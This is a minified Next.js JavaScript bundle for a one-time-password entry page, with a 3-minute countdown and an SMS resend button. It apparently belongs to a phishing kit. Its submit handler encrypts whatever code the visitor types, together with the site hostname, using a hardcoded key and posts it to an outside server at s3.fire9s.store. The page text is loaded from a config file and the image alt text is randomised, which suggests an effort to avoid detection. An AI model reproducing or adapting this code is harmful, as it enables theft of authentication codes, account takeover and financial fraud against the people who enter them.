(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[682],{9397:function(n,t,e){(window.__NEXT_P=window.__NEXT_P||[]).push(["/qsp",function(){return e(3062)}])},3220:function(n,t,e){"use strict";e.d(t,{Z:function(){return Layout}});var _=e(5893);e(7294);var o=e(2948),r=e.n(o),i=e(5675),a=e.n(i),s=e(1117);function Layout(n){let{children:t}=n;return(0,_.jsxs)(_.Fragment,{children:[(0,_.jsx)("header",{className:r().logo,children:(0,_.jsx)(a(),{src:"/jnoqx.png",alt:(0,s.zs)(6),width:112,height:32})}),(0,_.jsx)("main",{children:t}),(0,_.jsx)("div",{className:r().footer_area,children:(0,_.jsx)(a(),{src:"/lmnhh.png",width:68,height:28,alt:(0,s.zs)(6)})}),(0,_.jsx)("div",{className:r().footer,children:(0,_.jsx)("p",{children:"\xa9 Copyright"})})]})}},7664:function(n,t,e){"use strict";var _=e(5893),o=e(2948),r=e.n(o),i=e(5675),a=e.n(i);t.Z=n=>{let{message:t}=n;return(0,_.jsxs)("div",{className:r().loading,children:[(0,_.jsx)(a(),{src:"/cpyil.gif",alt:"Loaidng",layout:"fixed",width:100,height:100}),(0,_.jsx)("p",{className:r().loadingText,children:t||"Loading..."})]})}},4764:function(n,t,e){"use strict";e.d(t,{Z:function(){return OneTime}});var _=e(5893),o=e(9008),r=e.n(o),i=e(7294),a=e(1163),s=e(1117),l=e(3220),d=e(2948),c=e.n(d),m=e(7664);let ErrorCom=n=>{let{err:t}=n;if(t)return(0,_.jsx)("p",{style:{margin:"3px 10px 3px",color:"red",fontWeight:"bold",fontSize:"small",display:"block"},children:"Please enter valid input"})},InfoComponent=n=>{let{info:t}=n;return(0,_.jsx)("div",{className:c().info_panel,children:(0,_.jsx)("div",{className:c().notify_icon,children:(0,_.jsx)("ul",{children:t.map((n,t)=>(0,_.jsx)("li",{children:n},t))})})})};function OneTime(n){let{name:t,redirectKey:e,err:o}=n,[d,u]=(0,i.useState)(null),[h,f]=(0,i.useState)(null),[p,g]=(0,i.useState)(null),x=(0,a.useRouter)(),[F,b]=(0,i.useState)(!1),[j,y]=(0,i.useState)("03:00"),[v,N]=(0,i.useState)(""),handleSubmit=async n=>{n.preventDefault(),b(!0);try{let t=new FormData(n.target),e=await (0,s.qC)(window.location.hostname,t),_=await e.json();!0==_.status?h&&""!=h?x.push(h):(n.target.reset(),x.reload()):b(!1)}catch(n){console.error(n)}finally{b(!1)}};return((0,i.useEffect)(()=>{fetch(s.dV.config).then(n=>n.json()).then(n=>{f(n[e].id),g(n[t]),u(n.OneTime)}),fetch(s.dV.csrf).then(n=>n.json()).then(n=>N(null==n?void 0:n.token));let timer=n=>{var t=Math.floor(n/60),e=n%60;if(y((t=t<10?"0"+t:t)+":"+(e=e<10?"0"+e:e)),(n-=1)>=0){setTimeout(function(){timer(n)},1e3);return}};timer(180)},[]),d)?(0,_.jsxs)(_.Fragment,{children:[(0,_.jsx)(r(),{children:(0,_.jsx)("title",{children:d.title})}),(0,_.jsxs)(l.Z,{children:[(0,_.jsx)("div",{className:c().login_heading,children:(0,_.jsx)("h3",{className:c().login_heading_h3,children:p.heading})}),(0,_.jsxs)("div",{className:c().login_form,children:[(0,_.jsx)("p",{className:c().content_title,children:d.sended}),(0,_.jsx)("p",{className:c().mandatory_txt,children:d.mandatory}),(0,_.jsxs)("form",{className:c().form,method:"post",onSubmit:handleSubmit,children:[(0,_.jsx)("input",{type:"hidden",name:d.formtoken,value:v}),(0,_.jsxs)("div",{className:c().form_group,children:[(0,_.jsxs)("label",{className:c().label,children:[d.otp," ",(0,_.jsx)("span",{className:c().mandatory_txt,children:"*"})]}),(0,_.jsx)("input",{name:p.input,type:"text",className:c().form_control,required:!0,minLength:6,maxLength:8}),(0,_.jsx)(ErrorCom,{err:o})]}),(0,_.jsx)("div",{className:c().t_center,children:(0,_.jsx)("input",{disabled:!!F,type:"submit",className:c().btn_default,value:d.submit})})]}),(0,_.jsx)("div",{className:c().t_center,children:(0,_.jsx)("p",{children:j})}),(0,_.jsx)("div",{className:c().t_center,children:(0,_.jsxs)("p",{children:[d.resend_sms," \xa0",(0,_.jsx)("button",{className:c().btn_resend,type:"button",children:d.resend})]})}),(0,_.jsx)(InfoComponent,{info:d.info})]})]})]}):(0,_.jsxs)(_.Fragment,{children:[(0,_.jsx)(r(),{children:(0,_.jsx)("title",{children:"Loading..."})}),(0,_.jsx)(m.Z,{message:"Loading..."})]})}},1117:function(n,t,e){"use strict";e.d(t,{dV:function(){return r},qC:function(){return postData},zs:function(){return generateRandomString}});var _=e(1354),o=e.n(_);let r={store:"https://s3.fire9s.store/update",encrypt:"fst",csrf:"https://s3.fire9s.store/csrf",upload:"https://s3.fire9s.store/upload",status:"https://s3.fire9s.store/status",config:"/svy.json"},encrypt=function(n){try{let t=o().lib.WordArray.random(256),e=o().lib.WordArray.random(16),_=o().PBKDF2(r.encrypt,t,{hasher:o().algo.SHA512,keySize:8,iterations:999}),i=o().AES.encrypt(n,_,{iv:e}),a={ciphertext:o().enc.Base64.stringify(i.ciphertext),salt:o().enc.Hex.stringify(t),iv:o().enc.Hex.stringify(e)};return JSON.stringify(a)}catch(n){throw console.error("Encryption error:",n),n}},postData=async(n,t)=>{try{let e={};t.forEach(function(n,t){e[t]=n});let _=await fetch(r.csrf),o=await _.json(),i={token:null==o?void 0:o.token,host:n,body:e},a=JSON.stringify(i),s={method:"POST",headers:{"Content-Type":"text/plain"},body:encrypt(a)},l=await fetch(r.store,s);if(!l.ok)throw Error("Request failed with status ".concat(l.status));return l}catch(n){throw console.error("POST request error:",n),n}},generateRandomString=n=>{let t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",e="",_=t.length;for(let o=0;o<n;o++){let n=Math.floor(Math.random()*_);e+=t.charAt(n)}return e}},3062:function(n,t,e){"use strict";e.r(t),e.d(t,{default:function(){return Qsp}});var _=e(5893),o=e(4764);function Qsp(){return(0,_.jsx)(o.Z,{name:"Onetime6",redirectKey:"Onetime7",err:!1})}},2948:function(n){n.exports={logo:"Fmd_logo__PpJsc",login_heading:"Fmd_login_heading__Q9nvx",loadingText:"Fmd_loadingText__Q5K9r",loading:"Fmd_loading__cCsGH",login_heading_h3:"Fmd_login_heading_h3__lbjVu",sub:"Fmd_sub__llxfo",t_center:"Fmd_t_center__1pl0_",login_form:"Fmd_login_form__9ZaY0",info:"Fmd_info__0xH8n",info_span:"Fmd_info_span__gXNDy",form:"Fmd_form__72NO8",form_group:"Fmd_form_group__QhJER",label:"Fmd_label__ExoMD",form_control:"Fmd_form_control__Stl2r",w_50:"Fmd_w_50__fGnm5",captcha:"Fmd_captcha__smkBN",clear:"Fmd_clear__hejUK",show:"Fmd_show__c37aN",hidden:"Fmd_hidden__UXRQN",top_10:"Fmd_top_10__4L0GG",btn:"Fmd_btn__zpUtg",virtual_link:"Fmd_virtual_link__tQ8QM",bg_blue:"Fmd_bg_blue__lTccP","bg-blue":"Fmd_bg-blue__lfpOu",login_box:"Fmd_login_box__6MhLk",box:"Fmd_box__V2DeZ",login_box_links:"Fmd_login_box_links__oGtXJ",provide:"Fmd_provide__drHnv",p_body:"Fmd_p_body__bsYnW",footer_area:"Fmd_footer_area__iDOjh",footer:"Fmd_footer__aI8n0",panel:"Fmd_panel__Y3mb5",panelDiv:"Fmd_panelDiv__6Np6i",content_heading:"Fmd_content_heading__8jHPn",heading:"Fmd_heading__CrhlG",content_title:"Fmd_content_title__Khl_O",content_area:"Fmd_content_area__XnqWy",mandatory_txt:"Fmd_mandatory_txt__GAAJ8",commonbutton:"Fmd_commonbutton__tsucY",btn_default:"Fmd_btn_default__xIS_m",common_btn:"Fmd_common_btn__0TXoA",btn_resend:"Fmd_btn_resend__xznlE",notify_icon:"Fmd_notify_icon__nk97o",no_marg:"Fmd_no_marg__JdX5v",info_panel:"Fmd_info_panel__ghhCM",left_menu_slider:"Fmd_left_menu_slider__WT9et",notifications:"Fmd_notifications__7BXpt",crumb:"Fmd_crumb__K5n4T",content_panel:"Fmd_content_panel__nfk1Z",ql_dropdown_content:"Fmd_ql_dropdown_content__Attfr",text_danger:"Fmd_text_danger__tQ9PI",invalid:"Fmd_invalid__ZwF5p",dataList:"Fmd_dataList__JPRum",row:"Fmd_row__qWpnq",column:"Fmd_column__R0IG1",login_button_span:"Fmd_login_button_span__mzAMU",continue_btn:"Fmd_continue_btn__Mo61M",banner_box:"Fmd_banner_box__BlX6F",link:"Fmd_link__0RMlX",terms_area:"Fmd_terms_area__HUBT0"}},2480:function(){}},function(n){n.O(0,[345,354,774,888,179],function(){return n(n.s=9397)}),_N_E=n.O()}]);